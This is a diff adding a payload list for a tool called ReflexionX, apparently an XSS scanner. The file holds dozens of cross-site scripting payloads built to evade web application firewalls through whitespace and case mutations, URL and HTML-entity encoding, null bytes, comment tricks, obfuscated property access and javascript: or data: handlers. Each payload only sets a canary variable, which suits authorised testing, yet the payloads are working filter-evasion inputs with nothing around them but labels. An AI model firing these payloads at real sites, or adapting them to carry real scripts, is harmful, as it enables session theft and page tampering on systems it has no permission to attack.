@@ -1,0 +1,59 @@
+# ReflexionX v1.0.0 — Advanced WAF Bypass Payloads
+# Encoding mutations, whitespace tricks, and obfuscation
+# Each payload sets window._xss_confirmed = 'CANARY'
+
+# Whitespace variations
+<svg/onload=window._xss_confirmed='CANARY'>
+<svg	onload=window._xss_confirmed='CANARY'>
+<svg
+onload=window._xss_confirmed='CANARY'>
+<svg%0aonload=window._xss_confirmed='CANARY'>
+<svg%0d%0aonload=window._xss_confirmed='CANARY'>
+<svg%09onload=window._xss_confirmed='CANARY'>
+
+# Case mutations
+<SvG oNlOaD=window._xss_confirmed='CANARY'>
+<iMg SrC=x OnErRoR=window._xss_confirmed='CANARY'>
+<DeTaIlS oPeN oNtOgGlE=window._xss_confirmed='CANARY'>
+
+# Tag mutations
+<<svg onload=window._xss_confirmed='CANARY'>>
+<image src=x onerror=window._xss_confirmed='CANARY'>
+<isindex action="javascript:window._xss_confirmed='CANARY'">
+<x onclick=window._xss_confirmed='CANARY'>click
+
+# Encoding tricks
+%3Csvg+onload%3Dwindow._xss_confirmed%3D%27CANARY%27%3E
+%253Csvg%2bonload%253Dwindow._xss_confirmed%253D%2527CANARY%2527%253E
+&#60;svg onload=window._xss_confirmed='CANARY'&#62;
+&#x3C;svg onload=window._xss_confirmed='CANARY'&#x3E;
+
+# Null byte injection
+<svg%00onload=window._xss_confirmed='CANARY'>
+<img%00src=x%00onerror=window._xss_confirmed='CANARY'>
+
+# Comment tricks
+<!--><img src=x onerror=window._xss_confirmed='CANARY'>-->
+<svg><!--</svg><img src=x onerror=window._xss_confirmed='CANARY'>-->
+<svg onload=window._xss_confirmed='CANARY'><!--
+
+# JS obfuscation
+<svg onload=window['_xss_confirmed']='CANARY'>
+<svg onload=window[`_xss_confirmed`]=`CANARY`>
+<svg onload=self['_xss_confirmed']='CANARY'>
+<svg onload=top['_xss_confirmed']='CANARY'>
+<svg onload=this['ownerDocument']['defaultView']['_xss_confirmed']='CANARY'>
+
+# Backtick tricks
+<svg onload=`window._xss_confirmed='CANARY'`>
+<img src=x onerror=`window._xss_confirmed='CANARY'`>
+
+# Protocol handlers
+<a href="javascript:window._xss_confirmed='CANARY'">click</a>
+<a href="data:text/html,<script>window._xss_confirmed='CANARY'</script>">click</a>
+<a href="javascript&colon;window._xss_confirmed='CANARY'">click</a>
+<a href="&#106;avascript:window._xss_confirmed='CANARY'">click</a>
+
+# Concatenation tricks
+<svg onload=window['_xss_'+'confirmed']='CANARY'>
+<svg onload=window['\x5f\x78\x73\x73\x5f\x63onfirmed']='CANARY'>
